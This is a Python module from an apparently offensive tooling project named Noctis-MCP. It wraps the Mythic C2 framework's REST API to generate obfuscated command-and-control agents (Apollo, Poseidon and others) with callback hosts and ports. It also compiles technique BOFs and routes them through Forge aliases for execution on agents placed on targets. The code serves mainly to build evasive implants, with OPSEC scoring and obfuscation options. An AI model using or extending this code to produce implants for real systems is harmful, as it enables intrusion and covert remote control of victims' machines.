"""
Mythic C2 Adapter with Forge Integration
=========================================

Integrates with Mythic C2 framework to generate obfuscated agents.
Supports Forge command augmentation for BOF and .NET assembly execution.

Features:
- Multiple agent types (Apollo, Athena, Poseidon, etc.)
- REST API integration
- Modular C2 profiles
- Docker-based deployment
- **Forge integration** - BOF and .NET assembly aliases

References:
- Mythic Framework: https://github.com/its-a-feature/Mythic
- Forge: https://github.com/MythicAgents/forge
- Documentation: https://docs.mythic-c2.net

Author: Noctis-MCP Team
Phase: 4 - C2 Integration
Sprint: 4 - Mythic Integration
"""

import os
import sys
import json
import requests
import logging
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass

# Add parent directory to path
sys.path.append(str(Path(__file__).parent.parent))

from c2_adapters.base_adapter import C2Adapter, C2GenerationResult, BeaconStatus
from c2_adapters.config import MythicConfig, Protocol, Architecture, OutputFormat
from c2_adapters.shellcode_wrapper import ShellcodeWrapper, WrapperConfig
from compilation.bof_compiler import BOFCompiler, BOFResult


logger = logging.getLogger(__name__)


@dataclass
class MythicAgentInfo:
    """Information about generated Mythic agent"""
    name: str
    agent_type: str
    c2_profile: str
    arch: str
    format: str
    size: int
    c2_url: str
    shellcode_path: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'name': self.name,
            'agent_type': self.agent_type,
            'c2_profile': self.c2_profile,
            'arch': self.arch,
            'format': self.format,
            'size': self.size,
            'c2_url': self.c2_url,
            'shellcode_path': self.shellcode_path
        }


class MythicAdapter(C2Adapter):
    """
    Adapter for Mythic C2 framework.
    
    Mythic is a cross-platform C2 framework with:
    - Multiple agent types (Apollo, Apfell, Poseidon, Merlin, etc.)
    - Modular C2 profile system
    - REST API for agent generation
    - Docker-based deployment
    
    This adapter integrates with the Mythic REST API to generate
    agents and applies Noctis obfuscation techniques.
    """
    
    def __init__(
        self,
        config: MythicConfig,
        mythic_host: str = "127.0.0.1",
        mythic_port: int = 7443,
        api_token: Optional[str] = None,
        verbose: bool = False
    ):
        """
        Initialize Mythic adapter.
        
        Args:
            config: Mythic configuration
            mythic_host: Mythic server host
            mythic_port: Mythic server port (default: 7443)
            api_token: Mythic API token
            verbose: Enable verbose output
        """
        super().__init__(config, verbose)
        self.mythic_host = mythic_host
        self.mythic_port = mythic_port
        self.api_token = api_token or config.api_key
        self.base_url = f"https://{mythic_host}:{mythic_port}/api/v1.4"
        
        # Initialize BOF compiler for Forge integration
        self.bof_compiler = BOFCompiler(output_dir="bof_output")
        self.forge_enabled = True  # Forge command augmentation support

        if self.verbose:
            print(f"[*] MythicAdapter initialized")
            print(f"[*] Server: {mythic_host}:{mythic_port}")
            print(f"[*] Payload type: {config.payload_type}")
            print(f"[*] C2 profile: {config.c2_profile}")
            print(f"[*] Forge integration: enabled")
    
    def connect(self) -> bool:
        """
        Test connection to Mythic server.
        
        Returns:
            True if connection successful, False otherwise
        """
        if self.verbose:
            print(f"[*] Testing connection to Mythic server...")
        
        try:
            headers = {}
            if self.api_token:
                headers['Authorization'] = f'Bearer {self.api_token}'
            
            # Test connection to Mythic API
            response = requests.get(
                f"{self.base_url}/operations",
                headers=headers,
                verify=False,
                timeout=5
            )
            
            if response.status_code == 200:
                if self.verbose:
                    print(f"[+] Connected to Mythic server")
                return True
            else:
                if self.verbose:
                    print(f"[!] Connection failed: HTTP {response.status_code}")
                return False
                
        except requests.exceptions.ConnectionError:
            if self.verbose:
                print("[!] Connection error: Mythic server not reachable")
                print("[!] Make sure Mythic is running: sudo ./mythic-cli start")
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] Connection error: {e}")
            return False
    
    def validate_config(self) -> Tuple[bool, List[str]]:
        """
        Validate Mythic configuration.
        
        Returns:
            Tuple of (is_valid, error_messages)
        """
        errors = []
        
        # Validate payload type
        valid_agents = ['apollo', 'apfell', 'poseidon', 'merlin', 'atlas']
        if self.config.payload_type.lower() not in valid_agents:
            errors.append(f"Invalid payload type: {self.config.payload_type}. Must be one of {valid_agents}")
        
        # Validate C2 profile
        if not self.config.c2_profile:
            errors.append("C2 profile is required")
        
        # Validate API token
        if not self.api_token:
            errors.append("API token is required for Mythic integration")
        
        return len(errors) == 0, errors
    
    def generate_shellcode(self, output_path: str) -> Tuple[bool, str]:
        """
        Generate Mythic agent payload.
        
        Args:
            output_path: Path to save payload
        
        Returns:
            Tuple of (success, output_message)
        """
        if not self.api_token:
            return False, "API token is required. Set via MythicConfig or environment variable."
        
        if self.verbose:
            print(f"[*] Generating Mythic {self.config.payload_type} agent...")
        
        try:
            headers = {
                'Authorization': f'Bearer {self.api_token}',
                'Content-Type': 'application/json'
            }
            
            # Build payload generation request
            payload_data = {
                'payload_type': self.config.payload_type,
                'c2_profile': self.config.c2_profile,
                'architecture': self.config.architecture.value,
                'format': self.config.output_format.value,
                'callback_host': self.config.listener_host,
                'callback_port': self.config.listener_port,
                'encryption': self.config.encryption_key is not None
            }
            
            # Call Mythic API to generate payload
            response = requests.post(
                f"{self.base_url}/payloads",
                headers=headers,
                json=payload_data,
                verify=False,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                # Download the generated payload
                payload_uuid = result.get('uuid')
                
                if payload_uuid:
                    download_url = f"{self.base_url}/payloads/{payload_uuid}/download"
                    download_response = requests.get(
                        download_url,
                        headers=headers,
                        verify=False
                    )
                    
                    if download_response.status_code == 200:
                        with open(output_path, 'wb') as f:
                            f.write(download_response.content)
                        return True, f"Mythic agent generated successfully: {output_path}"
                
            return False, f"Mythic API error: HTTP {response.status_code}"
            
        except Exception as e:
            return False, f"Mythic agent generation failed: {str(e)}"
    
    def get_supported_protocols(self) -> List[str]:
        """
        Get list of supported protocols.
        
        Returns:
            List of protocol names
        """
        return ['https', 'http', 'dns', 'smb', 'websocket']
    
    def get_framework_info(self) -> Dict[str, Any]:
        """
        Get information about Mythic C2 framework.

        Returns:
            Dictionary with framework information including Forge integration
        """
        return {
            'framework': 'Mythic',
            'version': '2.3+',
            'protocols': self.get_supported_protocols(),
            'agent_types': ['Apollo', 'Athena', 'Poseidon', 'Merlin', 'Apfell'],
            'architectures': ['x64', 'x86', 'arm64'],
            'output_formats': ['exe', 'dll', 'shellcode', 'service_exe'],
            'features': [
                'Multiple agent types',
                'Modular C2 profiles',
                'REST API integration',
                'Docker-based deployment',
                'Custom agent development',
                'Advanced OPSEC features',
                'Forge BOF integration',
                '.NET assembly execution'
            ],
            'c2_profiles': ['http', 'https', 'dns', 'smb', 'websocket', 'custom'],
            'forge': {
                'enabled': self.forge_enabled,
                'description': 'Command augmentation for BOF and .NET assemblies',
                'agent_support': ['Apollo', 'Athena'],
                'commands': [
                    'forge_bof_* - Execute BOF via Apollo/Athena',
                    'forge_net_* - Execute .NET assemblies',
                    'forge_support - Dynamic agent registration'
                ]
            },
            'status': 'implemented',
            'requires_server': True,
            'installation': 'https://github.com/its-a-feature/Mythic'
        }

    def generate_forge_bof(self, technique_id: str, target_agent: str = "apollo") -> Dict[str, Any]:
        """
        Generate Forge BOF command for Mythic

        Forge is a "Command Augmentation" payload type that provides alias commands
        for BOF execution. It passes commands to Apollo/Athena agents.

        Per official Forge spec:
        - Forge doesn't deploy to targets
        - Provides alias commands that route to agent commands
        - Preconfigured for Apollo and Athena
        - Example: forge_bof_* → Apollo's execute_bof

        Args:
            technique_id: Noctis technique ID (e.g., NOCTIS-T004)
            target_agent: Target agent type (apollo, athena)

        Returns:
            Dictionary with Forge command configuration and BOF files
        """
        if self.verbose:
            print(f"[*] Generating Forge BOF for {technique_id} → {target_agent}")

        # Compile BOF using BOFCompiler
        bof_result = self.bof_compiler.compile_technique_to_bof(technique_id, "mythic")

        if not bof_result.success:
            return {
                'success': False,
                'error': bof_result.errors
            }

        # Generate Forge command name
        technique_name = technique_id.replace('NOCTIS-T', 'noctis_').replace('-', '_')
        forge_command = f"forge_bof_{technique_name}"

        # Create Forge configuration per official pattern
        forge_config = {
            'success': True,
            'command': forge_command,
            'x86_bof': bof_result.x86_path,
            'x64_bof': bof_result.x64_path,
            'target_agent': target_agent,
            'description': f'Execute {technique_id} BOF via {target_agent} agent',
            'usage': f'{forge_command} <session_id> [args]',
            'routing': f'{forge_command} → {target_agent}.execute_bof',
            'implementation_notes': [
                f'Forge routes this command to {target_agent} agent',
                'BOF is executed via existing execute_bof mechanism',
                'Requires Forge payload type installed in Mythic',
                'Requires Apollo or Athena agent on target'
            ]
        }

        if self.verbose:
            print(f"[+] Forge command: {forge_command}")
            print(f"[+] Routes to: {target_agent}.execute_bof")
            print(f"[+] BOF x86: {bof_result.x86_path}")
            print(f"[+] BOF x64: {bof_result.x64_path}")

        return forge_config


def generate_mythic_agent(
    listener_host: str,
    listener_port: int,
    agent_type: str = "apollo",
    c2_profile: str = "http",
    architecture: str = "x64",
    api_token: Optional[str] = None,
    techniques: Optional[List[str]] = None,
    obfuscate: bool = True,
    mythic_host: str = "127.0.0.1",
    mythic_port: int = 7443
) -> C2GenerationResult:
    """
    Convenience function to generate Mythic agent with Noctis obfuscation.
    
    This is the high-level API for generating Mythic agents.
    
    Requirements:
        - Mythic C2 framework must be installed and running
        - API token must be provided
        - Docker must be running
    
    Args:
        listener_host: C2 listener hostname or IP
        listener_port: C2 listener port
        agent_type: Agent type (apollo, apfell, poseidon, merlin, atlas)
        c2_profile: C2 profile name (http, https, dns, smb, websocket)
        architecture: Target architecture (x64, x86, arm64)
        api_token: Mythic API token
        techniques: List of Noctis technique IDs to apply
        obfuscate: Apply Noctis obfuscation techniques
        mythic_host: Mythic server host
        mythic_port: Mythic server port
    
    Returns:
        C2GenerationResult with agent information and paths
    
    Example:
        >>> result = generate_mythic_agent(
        ...     listener_host="192.168.1.100",
        ...     listener_port=80,
        ...     agent_type="apollo",
        ...     c2_profile="http",
        ...     api_token="your_api_token",
        ...     obfuscate=True
        ... )
        >>> if result.success:
        ...     print(f"Agent: {result.beacon_path}")
        ...     print(f"OPSEC: {result.opsec_score}/10")
    """
    # Create Mythic config with proper architecture mapping
    arch_map = {
        "x64": Architecture.X64,
        "x86": Architecture.X86,
        "arm64": Architecture.ARM64,
        "arm": Architecture.ARM
    }
    
    config = MythicConfig(
        listener_host=listener_host,
        listener_port=listener_port,
        protocol=c2_profile,
        architecture=arch_map.get(architecture.lower(), Architecture.X64),
        payload_type=agent_type,
        c2_profile=c2_profile,
        api_key=api_token or ""
    )
    
    # Create adapter
    adapter = MythicAdapter(
        config=config,
        mythic_host=mythic_host,
        mythic_port=mythic_port,
        api_token=api_token,
        verbose=True
    )
    
    # Generate agent
    result = adapter.generate_beacon(
        techniques=techniques or [],
        obfuscate=obfuscate
    )
    
    return result


# ============================================================================
# TESTING
# ============================================================================

def test_mythic_adapter():
    """Test Mythic adapter initialization"""
    print("[*] Testing Mythic C2 Adapter...")
    print()
    
    # Create config
    config = MythicConfig(
        listener_host="192.168.1.100",
        listener_port=80,
        protocol="http",
        payload_type="apollo",
        c2_profile="http",
        api_key="test_token_here"
    )
    
    print(f"[*] Config: {config.c2_profile}://{config.listener_host}:{config.listener_port}")
    print(f"[*] Payload type: {config.payload_type}")
    print(f"[*] C2 profile: {config.c2_profile}")
    print()
    
    # Create adapter
    adapter = MythicAdapter(config, verbose=True)
    print()
    
    # Test connection
    print("[*] Testing Mythic server connection...")
    connected = adapter.connect()
    print(f"[{'+'if connected else '!'}] Connection: {connected}")
    print()
    
    # Get framework info
    print("[*] Framework information:")
    info = adapter.get_framework_info()
    for key, value in info.items():
        if isinstance(value, list):
            print(f"  {key}:")
            for item in value:
                print(f"    - {item}")
        else:
            print(f"  {key}: {value}")
    
    print()
    print("[+] Mythic adapter test complete!")


if __name__ == "__main__":
    test_mythic_adapter()

